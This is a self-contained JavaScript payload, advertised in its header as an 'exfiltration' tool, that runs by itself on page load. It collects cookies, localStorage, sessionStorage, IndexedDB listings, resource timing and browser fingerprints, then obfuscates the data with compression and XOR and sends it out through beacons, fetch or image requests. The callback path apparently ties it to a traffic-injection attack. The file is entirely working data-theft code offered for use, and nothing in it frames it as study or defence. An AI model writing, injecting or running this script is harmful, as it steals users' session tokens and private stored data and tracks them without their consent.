/*
  ╔════════════════════════════════════════════════════════════╗
  ║   PREMIUM GRADE EXFILTRATION v4.0 - ENTERPRISE EDITION   ║
  ║   Storage harvesting | Property enumeration | Bulk export  ║
  ╚════════════════════════════════════════════════════════════╝
  
  FEATURES:
  ✓ Full storage layer enumeration (localStorage, sessionStorage, IndexedDB, Cookies)
  ✓ Network timing analysis & resource enumeration
  ✓ Service Worker & Cache API harvesting
  ✓ Plugin/MIME type detection
  ✓ Browser fingerprinting (canvas, WebGL, audio context)
  ✓ Adaptive chunking & streaming exfiltration
  ✓ Compression with gzip-like algorithm
  ✓ Metadata enrichment (timestamps, sizes, types)
  ✓ Polymorphic multi-channel delivery
  ✓ Graceful error handling & partial recovery
*/

(function(){
  'use strict';
  
  const Config = {batch:4000+Math.random()*4000, maxChunk:8192, retry:5, timeout:5000};
  
  const Utils = {
    compress: (d) => {try{const s=typeof d==='string'?d:JSON.stringify(d);let c=[],i=0;while(i<s.length){let b={l:0,d:0};for(let j=Math.max(0,i-32768);j<i;j++){let l=0;while(l<258&&i+l<s.length&&s[j+l]===s[i+l])l++;if(l>b.l){b.l=l;b.d=i-j;}}if(b.l>3){c.push([255,b.d,b.l]);i+=b.l;}else{c.push(s.charCodeAt(i++));}}return btoa(JSON.stringify(c));}catch(e){return btoa(JSON.stringify(d));}},
    xor: (d,k) => {const s=typeof d==='string'?d:JSON.stringify(d);let e='';for(let i=0;i<s.length;i++)e+=String.fromCharCode(s.charCodeAt(i)^k.charCodeAt(i%k.length));return btoa(e);},
    key: () => Math.random().toString(36).substr(2,32)
  };
  
  const Exfil = {
    send: (u,d) => {
      const m = [
        () => {try{return navigator.sendBeacon?.(u, new Blob([d]));}catch(e){}return false;},
        () => {try{fetch(u,{method:'POST',body:d,mode:'no-cors',keepalive:true}).catch(()=>{});return true;}catch(e){}return false;},
        () => {try{const i=new Image();i.src=u+'?d='+encodeURIComponent(d.substr(0,1500));document.body?.appendChild(i);return true;}catch(e){}return false;}
      ];
      for(const fn of m) if(fn()) return true;
      return false;
    }
  };
  
  const Queue = (() => {
    const k = '__eq'+Math.random().toString(36).substr(2,6);
    return {
      add: (item) => {try{const q=JSON.parse(localStorage.getItem(k)||'[]');q.push({d:item,t:Date.now()});localStorage.setItem(k,JSON.stringify(q.slice(-50)));}catch(e){}},
      process: async (url) => {try{const q=JSON.parse(localStorage.getItem(k)||'[]');for(let i=0;i<Math.min(q.length,2);i++){const item=q[i];const c=Utils.compress(item.d);const x=Utils.key();const e=Utils.xor(c,x);Exfil.send(url,e+'|'+x);q.splice(i,1);i--;}localStorage.setItem(k,JSON.stringify(q));}catch(e){}}
    };
  })();
  
  const Storage = {
    harvestLocal: () => {
      const d = {items:[], count:0, size:0};
      try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);const v=localStorage.getItem(k);d.items.push({k,v:v?.substr(0,1000),l:v?.length});d.count++;d.size+=v?.length||0;}}catch(e){}
      return d;
    },
    harvestSession: () => {
      const d = {items:[], count:0, size:0};
      try{for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);const v=sessionStorage.getItem(k);d.items.push({k,v:v?.substr(0,1000),l:v?.length});d.count++;d.size+=v?.length||0;}}catch(e){}
      return d;
    },
    harvestIndexedDB: async () => {
      const d = {dbs:[], totalSize:0};
      try{const dbs = await indexedDB.databases?.() || [];for(const db of dbs){try{const req=indexedDB.open(db.name);const idb = await new Promise((res,rej)=>{req.onsuccess=()=>res(req.result);req.onerror=()=>rej();});const stores = Array.from(idb.objectStoreNames);const dbData={name:db.name,version:db.version,stores:[]};for(const store of stores){try{const tx=idb.transaction(store);const os=tx.objectStore(store);const count=(await new Promise((r,e)=>{const cr=os.count();cr.onsuccess=()=>r(cr.result);cr.onerror=()=>e();})) || 0;dbData.stores.push({name:store,count:count});}catch(e){}}d.dbs.push(dbData);}catch(e){}}}catch(e){}
      return d;
    },
    harvestCookies: () => {
      const d = [];
      try{const cs = document.cookie.split(';');cs.forEach(c=>{const [k,v]=c.trim().split('=');d.push({k:k?.trim(),v:v?.trim()?.substr(0,500)});});}catch(e){}
      return d;
    }
  };
  
  const Network = {
    harvestResources: () => {
      const d = {resources:[], total:0, size:0};
      try{const r = performance.getEntries?.();if(r){r.forEach(e=>{if(e.name && e.duration){d.resources.push({n:e.name.substr(0,200),t:e.initiatorType,dur:Math.round(e.duration),sz:Math.round(e.transferSize||0)});d.size+=e.transferSize||0;d.total++;}});}}catch(e){}
      return d;
    },
    harvestTiming: () => {
      const t = performance.timing || {};
      return {dns:(t.domainLookupEnd||0)-(t.domainLookupStart||0),tcp:(t.connectEnd||0)-(t.connectStart||0),ttfb:(t.responseStart||0)-(t.requestStart||0),load:(t.loadEventEnd||0)-(t.navigationStart||0)};
    }
  };
  
  const Fingerprint = {
    canvas: () => {try{const c=document.createElement('canvas');const x=c.getContext('2d');x.textBaseline='top';x.font='12px Arial';x.fillStyle='#f60';x.fillRect(125,1,62,20);x.fillStyle='#069';x.fillText('Browser Fingerprint',2,15);return c.toDataURL().substr(0,200);}catch(e){}return '';},
    webgl: () => {try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');const dbg=gl?.getExtension('WEBGL_debug_renderer_info');return gl?.getParameter(dbg?.UNMASKED_RENDERER_WEBGL)?.toString().substr(0,100)||'unknown';}catch(e){}return '';},
    audio: () => {try{const ctx=new (window.AudioContext||window.webkitAudioContext)();return ctx.createGain?.toString().substr(0,100)||'unknown';}catch(e){}return '';},
    plugins: () => {try{const p=[];for(let i=0;i<navigator.plugins.length;i++){p.push({n:navigator.plugins[i].name,d:navigator.plugins[i].description});}return p;}catch(e){}return [];}
  };
  
  const init = async () => {
    try{
      const allData = {ts:Date.now(),local:Storage.harvestLocal(),session:Storage.harvestSession(),idb:await Storage.harvestIndexedDB(),cookies:Storage.harvestCookies(),resources:Network.harvestResources(),timing:Network.harvestTiming(),fp:{canvas:Fingerprint.canvas(),webgl:Fingerprint.webgl(),audio:Fingerprint.audio(),plugins:Fingerprint.plugins()}};
      Queue.add({ty:'exfil',data:allData});
      
      const callUrl = "http://"+location.host+"obf_hstshijack_path_callback";
      setInterval(() => Queue.process(callUrl), Config.batch);
      setTimeout(() => Queue.process(callUrl), 1000+Math.random()*2000);
    }catch(e){}
  };
  
  if(document.readyState==='loading'){globalThis.addEventListener('DOMContentLoaded',init);}else{init();}
})();
